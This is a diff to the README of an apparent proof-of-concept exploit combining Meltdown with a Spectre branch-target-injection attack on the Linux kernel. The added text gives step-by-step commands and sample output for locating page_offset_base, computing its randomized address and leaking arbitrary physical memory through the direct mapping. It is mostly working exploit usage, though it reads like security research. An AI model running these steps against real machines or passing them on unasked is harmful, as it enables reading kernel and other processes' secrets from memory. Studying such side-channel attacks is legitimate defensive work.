@@ -61,10 +61,27 @@ At last, we'll cheat (due to no KASLR bypass) to retrieve the ASLR base
 # Usage
     ./build.sh  
     tasket 0x1 ./doit <aslr_base> <virt_addr> <len>
+    
+To read physical memory, first we'll dump the *page_offset_base* pointer from the kernel. This should equal 0xffff880000000000 on kernels without KASLR. Otherwise, it'll be randomized. This is the address of the direct mapping of all physical memory into virtual memory.
+
+    $ grep D.page_offset_base ../System.map-*
+    ffffffff81e482e8 D page_offset_base 
+    
+To dump it, we'll add the offset from the kernel image ASLR base we already have:
   
-    $ taskset 0x1 ./doit 0xffffffff92a00000 0xffffffff92c47cc0 0x20
-    0f 1f 44 00 00 55 48 89 e5 41 56 41 55 41 54 53
-    49 89 f5 49 89 d6 48 83 ec 18 65 48 8b 04 25 28
+    $ taskset 0x1 ./doit 0xffffffff92a00000 $((0xffffffff81e482e8 + (0xffffffff92a00000 - 0xffffffff81000000))) 0x8
+    00 00 00 c0 5e 95 ff ff
+
+There is a utility included here that loads a value into physical memory. It then makes sure the value is flushed from the caches. The utility is kept sleeping in the background so that the memory isn't freed by the kernel (and perhaps overwritten). 
+
+    $ sudo ./phys &
+    Virt 0x7ffebda43860, Phys: 0x37e0ed850
+
+Now having recovered the *page_offset_base*, we can read data from a physical address:
+
+    $ taskset 0x1 ./doit 0xffffffff92a00000 $((0xffff955ec0000000 + 0x37e0ed850)) 0x20
+    de ad be ef ba be ca fe de ad be ef ba be ca fe
+    de ad be ef ba be ca fe de ad be ef ba be ca fe
 
 # How this works
 Fist of all, this PoC implements the basic version of Meltdown, from the Meltdown whitepaper. However this attack is limited to only reading data from the L1D cache (as explained by Google Project Zero). To overcome this limitation, this PoC uses an additional Spectre BTI attack against the kernel.
